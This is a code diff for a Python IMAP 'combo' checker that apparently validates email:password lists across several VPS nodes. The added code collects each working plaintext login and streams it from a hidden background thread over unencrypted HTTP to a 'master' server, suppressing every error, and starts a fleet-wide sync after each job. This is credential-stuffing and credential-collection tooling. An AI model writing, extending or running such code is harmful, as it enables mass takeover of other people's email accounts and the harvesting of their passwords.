@@ -83,10 +83,54 @@ def load_already_accounts() -> set:
     return res
 
 _ALREADY_GLOBAL_LOCK = threading.Lock()
+_PENDING_LIVE_COMBOS = []
+_PENDING_LIVE_LOCK = threading.Lock()
+
+
+def _push_already_to_master_loop():
+    """Background worker pushing newly verified combos in realtime to Master node."""
+    import urllib.request
+    while True:
+        time.sleep(2.5)
+        to_send = []
+        with _PENDING_LIVE_LOCK:
+            if _PENDING_LIVE_COMBOS:
+                to_send = list(_PENDING_LIVE_COMBOS)
+                _PENDING_LIVE_COMBOS.clear()
+        if not to_send:
+            continue
+        try:
+            import vps_monitoring
+            nodes = vps_monitoring.load_nodes()
+            master_host = None
+            for n in nodes:
+                name = str(n.get("name", "")).lower()
+                if "primary" in name or "master" in name:
+                    master_host = n.get("host")
+                    break
+            if not master_host and nodes:
+                master_host = nodes[0].get("host")
+
+            if master_host:
+                payload = json.dumps({"combos": to_send}).encode("utf-8")
+                req = urllib.request.Request(
+                    f"http://{master_host}/sbb/api/sync/push-already",
+                    data=payload,
+                    headers={"Content-Type": "application/json"}
+                )
+                urllib.request.urlopen(req, timeout=3.5)
+        except Exception:
+            pass
+
+
+_streamer_thread = threading.Thread(target=_push_already_to_master_loop, daemon=True)
+_streamer_thread.start()
+
 
 def record_live_to_already(email_addr: str, password: str):
-    """Save verified live combo to global already_accounts.txt across all locations."""
-    line = f"{email_addr.strip().lower()}:{password.strip()}\n"
+    """Save verified live combo to global already_accounts.txt across all locations and push to master."""
+    clean_combo = f"{email_addr.strip().lower()}:{password.strip()}"
+    line = f"{clean_combo}\n"
     targets = [
         "/opt/pmj/imap/already_accounts.txt",
         "/opt/imap-checker/already_accounts.txt",
@@ -104,6 +148,8 @@ def record_live_to_already(email_addr: str, password: str):
                         f.write(line)
             except Exception:
                 pass
+    with _PENDING_LIVE_LOCK:
+        _PENDING_LIVE_COMBOS.append(clean_combo)
 
 # Skip-domains file (project root) — user-editable list of substrings
 # matched against email domain. Loaded per-job in ImapChecker.__init__.
@@ -1396,6 +1442,16 @@ class ImapChecker:
 
             if not self.is_stopped:
                 self.status = "done"
+
+                def _post_job_auto_sync():
+                    try:
+                        time.sleep(1.5)
+                        import vps_monitoring
+                        vps_monitoring.run_sync_all()
+                    except Exception:
+                        pass
+
+                threading.Thread(target=_post_job_auto_sync, daemon=True).start()
 
         watcher = threading.Thread(target=_runner, daemon=True)
         watcher.start()
